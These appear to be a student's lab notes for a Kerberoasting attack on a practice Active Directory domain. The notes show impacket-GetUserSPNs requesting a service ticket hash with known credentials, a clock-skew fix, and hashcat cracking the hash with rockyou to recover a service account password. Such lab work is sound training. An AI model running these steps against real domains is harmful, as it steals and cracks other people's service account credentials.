# Kerberoasting #
Run impacket-GetUserSPNs using known credentials
```
┌──(kali㉿kali)-[~]
└─$ impacket-GetUserSPNs MARVEL.local/fcastle:Password1 -dc-ip 10.0.2.15 -request
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName                    Name        MemberOf                                                     PasswordLastSet             LastLogon  Delegation 
--------------------------------------  ----------  -----------------------------------------------------------  --------------------------  ---------  ----------
HYDRA-DC/sqlservice.MARVEL.local:60111  sqlservice  CN=Group Policy Creator Owners,OU=Groups,DC=MARVEL,DC=local  2024-12-12 00:17:51.754327  <never>               



[-] CCache file is not found. Skipping...
[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
                                                                                                                    
┌──(kali㉿kali)-[~]
└─$ 
```

If you receive the 'KRB_AP_ERR_SKEW: Clock skew too great' error above, sync clock to target
```
┌──(kali㉿kali)-[~]
└─$ date && sudo ntpdate 10.0.2.15 && date
Thu Dec 26 08:41:09 PM EST 2024
2024-12-26 23:41:09.232958 (-0500) +10799.749731 +/- 0.000300 10.0.2.15 s1 no-leap
CLOCK: time stepped by 10799.749731
Thu Dec 26 11:41:09 PM EST 2024
┌──(kali㉿kali)-[~]
└─$
```

Successful run of impacket-GetUserSPNs
```
┌──(kali㉿kali)-[~]
└─$ impacket-GetUserSPNs MARVEL.local/fcastle:Password1 -dc-ip 10.0.2.15 -request
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName                    Name        MemberOf                                                     PasswordLastSet             LastLogon  Delegation 
--------------------------------------  ----------  -----------------------------------------------------------  --------------------------  ---------  ----------
HYDRA-DC/sqlservice.MARVEL.local:60111  sqlservice  CN=Group Policy Creator Owners,OU=Groups,DC=MARVEL,DC=local  2024-12-12 00:17:51.754327  <never>               



[-] CCache file is not found. Skipping...
$krb5tgs$23$*sqlservice$MARVEL.LOCAL$MARVEL.local/sqlservice*$f76682df231820ae8c0df442c6417948$a8cd98504801eab3713d75a6b6e3f397e6a5c7b9478df1fd3df408ee37e9a1756db976edfd8476d9f56e062be7e17c5580856737820447592b9fd82573a3328602c44fb8d50b1601d5e0eb6d1335ec5da257d96afe46cc27a46827c53b898cd4aa4d3867b0b4ccd539015abed95328ad2fa2e2d5759029b062f62b8bf81d75de24199e9af6772daf1c5045745770f3d4bb08c439988c00ff31df6e7f1bed9e8882661ea8550dc798073b04c7ed20100347479c20299330be516433ac88f8cb75cad74f0cb302d6bc7b7a45fcab4fcf03f8e3edf8338dc157cf1434eabe42d951685a589bccd1b5e80a979a0a2d86a8921dc8e4a7120b56b534c9453ec123071dc1b95ed2a7e869d64922bfc8dcdfaa2538dc035c90add0691d8a82d103f04cc7099573ab14fd978f179268788dd9a669cf589b3e73872c3e68b8fe6287c4bda16bfe1a42ab55f03a65907c228efbfb619ea506f67011045129cb3e61c7f747d68eb358f5acc9f70eeee327c9b5e2950d4d8bd739941e49eb3126515620c9ef6a065cc24b692130f7bac265732f8ae0a185696c5bb0e7283c61eb37f81934c661d0c50714a7e116f30c26e878ac2a6ac2135bb62414489170e4ceb7475e3c369e5c21dbb952e875df79d003e678b378c51415c513bffa96ee30023d101c38e5915b52f6fecb4f7315425a2f8f270b27ece112f314b997053f0c7608be64c7623dbf459193dd6dba71257d33bd402203f452aa60d55e0a0b5e0a90f6882a050e16747102fdf1045e5e830c9bff44bbda6acee6c164a2c70f383c679cc2f938acdb63bafc99c13691decacc9c5416a261c6b200b6cac564e4ba61cd075dd224cf1c633b2309c0f9307d936d62909edb5b144a79ace3e92b6c98692c78ff77468e43816061f9214fd485d60a10ab2f198555737e644d2191a0cca1706d4b9a3cce15674dd7bb8d0629859c9f84e28caffbb722cddbddda9c505877582c9aae5692d56d5422396ec81988e4e0f9cedabf37e64515c75da067dc1e277f29c790a7eadfe9a4e36317ca02e6b87a29a0f9d72619f822ca4bed942af6fd3b5fbbfeabb12eb20fe8dcbd233194b086b787e3a0bba72194aae78855b7ef948af912ef954e018f1c363abbaa4c08cbb6fe58df7c9b9fb976f545980f1c77fc8918f902ea427df6391e0649a5576afdc6569c573d8ba90eb9f5e1687518471a9ff4d43f3bdbf32be70145726cd053363be1ceec2d75d4909d448d8ffdac0e485b31bba500a429656aa6e6a5fb5888792d343f2b45c9367e611ce1e237e73e26eb47dd8e8395ec57b10821c7b7b68d4b668cb00f573cfa3356e22edab029a7dc62f035c0911150f9150283d0ac730ba4146a2f828e000da538854a6d236f013059a9044ea071aee4acb0068661911504526818d5bf02669e9aba92ef5dd8d79f764849570a3dce2faf2bd5e0b6ad0084d43c019ca302a24f38e358b87c986894dd5ca6b65e616c76fca781ef6cd0f9bbef5f75
                                                                                                                    
┌──(kali㉿kali)-[~]
└─$ 
```

Save the hash
```
┌──(kali㉿kali)-[~]
└─$ vi nthash.txt
$krb5tgs$23$*sqlservice$MARVEL.LOCAL$MARVEL.local/sqlservice*$f76682df231820ae8c0df442c6417948$a8cd98504801eab3713d75a6b6e3f397e6a5c7b9478df1fd3df408ee37e9a1756db976edfd8476d9f56e062be7e17c5580856737820447592b9fd82573a3328602c44fb8d50b1601d5e0eb6d1335ec5da257d96afe46cc27a46827c53b898cd4aa4d3867b0b4ccd539015abed95328ad2fa2e2d5759029b062f62b8bf81d75de24199e9af6772daf1c5045745770f3d4bb08c439988c00ff31df6e7f1bed9e8882661ea8550dc798073b04c7ed20100347479c20299330be516433ac88f8cb75cad74f0cb302d6bc7b7a45fcab4fcf03f8e3edf8338dc157cf1434eabe42d951685a589bccd1b5e80a979a0a2d86a8921dc8e4a7120b56b534c9453ec123071dc1b95ed2a7e869d64922bfc8dcdfaa2538dc035c90add0691d8a82d103f04cc7099573ab14fd978f179268788dd9a669cf589b3e73872c3e68b8fe6287c4bda16bfe1a42ab55f03a65907c228efbfb619ea506f67011045129cb3e61c7f747d68eb358f5acc9f70eeee327c9b5e2950d4d8bd739941e49eb3126515620c9ef6a065cc24b692130f7bac265732f8ae0a185696c5bb0e7283c61eb37f81934c661d0c50714a7e116f30c26e878ac2a6ac2135bb62414489170e4ceb7475e3c369e5c21dbb952e875df79d003e678b378c51415c513bffa96ee30023d101c38e5915b52f6fecb4f7315425a2f8f270b27ece112f314b997053f0c7608be64c7623dbf459193dd6dba71257d33bd402203f452aa60d55e0a0b5e0a90f6882a050e16747102fdf1045e5e830c9bff44bbda6acee6c164a2c70f383c679cc2f938acdb63bafc99c13691decacc9c5416a261c6b200b6cac564e4ba61cd075dd224cf1c633b2309c0f9307d936d62909edb5b144a79ace3e92b6c98692c78ff77468e43816061f9214fd485d60a10ab2f198555737e644d2191a0cca1706d4b9a3cce15674dd7bb8d0629859c9f84e28caffbb722cddbddda9c505877582c9aae5692d56d5422396ec81988e4e0f9cedabf37e64515c75da067dc1e277f29c790a7eadfe9a4e36317ca02e6b87a29a0f9d72619f822ca4bed942af6fd3b5fbbfeabb12eb20fe8dcbd233194b086b787e3a0bba72194aae78855b7ef948af912ef954e018f1c363abbaa4c08cbb6fe58df7c9b9fb976f545980f1c77fc8918f902ea427df6391e0649a5576afdc6569c573d8ba90eb9f5e1687518471a9ff4d43f3bdbf32be70145726cd053363be1ceec2d75d4909d448d8ffdac0e485b31bba500a429656aa6e6a5fb5888792d343f2b45c9367e611ce1e237e73e26eb47dd8e8395ec57b10821c7b7b68d4b668cb00f573cfa3356e22edab029a7dc62f035c0911150f9150283d0ac730ba4146a2f828e000da538854a6d236f013059a9044ea071aee4acb0068661911504526818d5bf02669e9aba92ef5dd8d79f764849570a3dce2faf2bd5e0b6ad0084d43c019ca302a24f38e358b87c986894dd5ca6b65e616c76fca781ef6cd0f9bbef5f75                                                                                                                    
┌──(kali㉿kali)-[~]
└─$
```

Crack the hash
```
┌──(kali㉿kali)-[~]
└─$ hashcat -m 13100 nthash.txt /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu-sandybridge-AMD Ryzen 5 4500 6-Core Processor, 1438/2941 MB (512 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB
                                                                                                                    
Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

Cracking performance lower than expected?                 

* Append -O to the commandline.
  This lowers the maximum supported password/salt length (usually down to 32).

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

$krb5tgs$23$*sqlservice$MARVEL.LOCAL$MARVEL.local/sqlservice*$f76682df231820ae8c0df442c6417948$a8cd98504801eab3713d75a6b6e3f397e6a5c7b9478df1fd3df408ee37e9a1756db976edfd8476d9f56e062be7e17c5580856737820447592b9fd82573a3328602c44fb8d50b1601d5e0eb6d1335ec5da257d96afe46cc27a46827c53b898cd4aa4d3867b0b4ccd539015abed95328ad2fa2e2d5759029b062f62b8bf81d75de24199e9af6772daf1c5045745770f3d4bb08c439988c00ff31df6e7f1bed9e8882661ea8550dc798073b04c7ed20100347479c20299330be516433ac88f8cb75cad74f0cb302d6bc7b7a45fcab4fcf03f8e3edf8338dc157cf1434eabe42d951685a589bccd1b5e80a979a0a2d86a8921dc8e4a7120b56b534c9453ec123071dc1b95ed2a7e869d64922bfc8dcdfaa2538dc035c90add0691d8a82d103f04cc7099573ab14fd978f179268788dd9a669cf589b3e73872c3e68b8fe6287c4bda16bfe1a42ab55f03a65907c228efbfb619ea506f67011045129cb3e61c7f747d68eb358f5acc9f70eeee327c9b5e2950d4d8bd739941e49eb3126515620c9ef6a065cc24b692130f7bac265732f8ae0a185696c5bb0e7283c61eb37f81934c661d0c50714a7e116f30c26e878ac2a6ac2135bb62414489170e4ceb7475e3c369e5c21dbb952e875df79d003e678b378c51415c513bffa96ee30023d101c38e5915b52f6fecb4f7315425a2f8f270b27ece112f314b997053f0c7608be64c7623dbf459193dd6dba71257d33bd402203f452aa60d55e0a0b5e0a90f6882a050e16747102fdf1045e5e830c9bff44bbda6acee6c164a2c70f383c679cc2f938acdb63bafc99c13691decacc9c5416a261c6b200b6cac564e4ba61cd075dd224cf1c633b2309c0f9307d936d62909edb5b144a79ace3e92b6c98692c78ff77468e43816061f9214fd485d60a10ab2f198555737e644d2191a0cca1706d4b9a3cce15674dd7bb8d0629859c9f84e28caffbb722cddbddda9c505877582c9aae5692d56d5422396ec81988e4e0f9cedabf37e64515c75da067dc1e277f29c790a7eadfe9a4e36317ca02e6b87a29a0f9d72619f822ca4bed942af6fd3b5fbbfeabb12eb20fe8dcbd233194b086b787e3a0bba72194aae78855b7ef948af912ef954e018f1c363abbaa4c08cbb6fe58df7c9b9fb976f545980f1c77fc8918f902ea427df6391e0649a5576afdc6569c573d8ba90eb9f5e1687518471a9ff4d43f3bdbf32be70145726cd053363be1ceec2d75d4909d448d8ffdac0e485b31bba500a429656aa6e6a5fb5888792d343f2b45c9367e611ce1e237e73e26eb47dd8e8395ec57b10821c7b7b68d4b668cb00f573cfa3356e22edab029a7dc62f035c0911150f9150283d0ac730ba4146a2f828e000da538854a6d236f013059a9044ea071aee4acb0068661911504526818d5bf02669e9aba92ef5dd8d79f764849570a3dce2faf2bd5e0b6ad0084d43c019ca302a24f38e358b87c986894dd5ca6b65e616c76fca781ef6cd0f9bbef5f75:MYpassword123#
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*sqlservice$MARVEL.LOCAL$MARVEL.local/s...ef5f75
Time.Started.....: Thu Dec 26 20:46:10 2024 (17 secs)
Time.Estimated...: Thu Dec 26 20:46:27 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   499.3 kH/s (0.88ms) @ Accel:256 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10846208/14344385 (75.61%)
Rejected.........: 0/10846208 (0.00%)
Restore.Point....: 10845696/14344385 (75.61%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: MYrockyou82 -> MYSELFonly4EVER
Hardware.Mon.#1..: Util: 39%

Started: Thu Dec 26 20:45:37 2024
Stopped: Thu Dec 26 20:46:28 2024
                                                                                                                    
┌──(kali㉿kali)-[~]
└─$
```
